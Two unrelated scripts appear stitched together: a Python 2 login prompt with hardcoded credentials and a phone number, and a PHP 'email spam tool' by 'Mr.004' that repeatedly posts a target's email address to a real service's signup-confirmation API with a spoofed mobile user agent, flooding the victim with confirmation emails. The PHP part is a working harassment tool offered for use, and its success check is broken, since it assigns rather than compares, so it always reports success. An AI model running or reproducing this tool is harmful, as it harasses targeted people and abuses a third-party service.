import os, sys

print ("\033[1;32mSilahkan Masukkan Username & Password Anda")

print ("\033[1;32matau silahkan Hubungi wa 081228244242")

username = 'Mr_004'      

password = 'Dia Ganteng'



def restart():

	ngulang = sys.executable

	os.execl(ngulang, ngulang, *sys.argv)



def main():

	uname = raw_input("username : ")

	if uname == username:

		pwd = raw_input("password : ")



		if pwd == password:

			print "\033[1;32mAlhmdllh sudah masuk juga..", 

			sys.exit()



		else:

			print "\033[1;32mMaaf Masukkan password Anda salah... [?]\033[00m"

			print "Silahkan segera log-in kembali...!!\n"

			restart()



	else:

		print "\033[1;32mMaaf Masukkan Username Anda salah... [?]\033[00m"

		print "Silahkan segera log-in kembali...!!\n"

		restart()



try:

	main()

except KeyboardInterrupt:

	os.system('clear')

	restart()
<?php
function gass($target, $jumlah) {
for ($i=1; $i <= $jumlah; $i++) {
$su = array("email" => "$target", "device_id" => "6bb443543d62ab32");
$gas = json_encode($su);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.surveyon.com/surveyon_api/mobile/v1_1/signup/confirmation_key");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $gas);
curl_setopt($ch, CURLOPT_USERAGENT, "surveyon/2.0.3 (Android: 6.0.1; MODEL:ASUS_X00AD; PRODUCT:WW_Phone; MANUFACTURER:asus;)");
$gas = curl_exec($ch);
curl_close($ch);
$respon = json_decode($gas);
if ($respon->code = 200) {
	echo $i .".BERHASIL\n";
	}else{
		echo $i. ".GAGAL\n";
		}
     }
}

$banner = "
============================================
                      
      mmmmm           mmmmm 
      MM `7MMM.     ,MMF'MM 
      MM   MMMb    dPMM  MM 
      MM   M YM   ,M MM  MM 
      MM   M  Mb  M' MM  MM 
      MM   M  YM.P'  MM  MM 
      MM   M  `YM'   MM  MM 
      MM .JML. `'  .JMML.MM 
      MM                 MM 
      MMmmm           mmmMM 
                                          
 [+] Alat Spam Email [+]
 Coded by  : Mr.004
 Team      : -
 Github    : https://github.com/Mr-004Tols
============================================\n";
sleep(2);
echo $banner;
sleep(1);
echo "### masukan email target : ";
$target = trim(fgets(STDIN));
sleep(1);
echo "### masukan jumlah : ";
$jumlah =  trim(fgets(STDIN));
sleep(1);
echo "\n\nRESULT :\n";
gass($target, $jumlah);

?>
